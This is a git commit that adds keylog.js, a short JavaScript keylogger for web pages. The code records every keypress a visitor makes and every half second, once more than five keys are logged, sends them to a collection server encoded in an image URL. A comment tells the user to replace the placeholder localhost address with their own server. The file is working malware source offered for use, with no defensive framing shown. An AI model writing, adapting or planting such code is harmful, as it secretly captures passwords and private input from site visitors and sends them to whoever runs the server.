31ed41a99eeee2054eff498e06172c290f1a3005
MaximUgarov <maximkaxaxaxa@mail.ru>
2020-09-28 17:52:51 +0300

    first commit

---
+++ keylog.js
@@ -0,0 +1,18 @@
+// Record all key presses into an array
+var presses = [];
+window.addEventListener("keydown", function(evt){
+  presses.push(evt.key);
+});
+
+// Push to server at regular intervals
+// Reduce interval timing for more frequent recordings, but increases server load
+// You can also set this to send only if certain number of key stroke were made.
+window.setInterval(function () {
+  if (presses.length>5) {
+    var data = encodeURIComponent(JSON.stringify(presses));
+    //encodeURIComponent
+    console.log(data);
+    new Image().src = "http://127.0.0.1:5500/keylog.php?k=" + data; // CHANGE THIS URL TO YOUR OWN!
+    presses = [];
+  }
+}, 500);
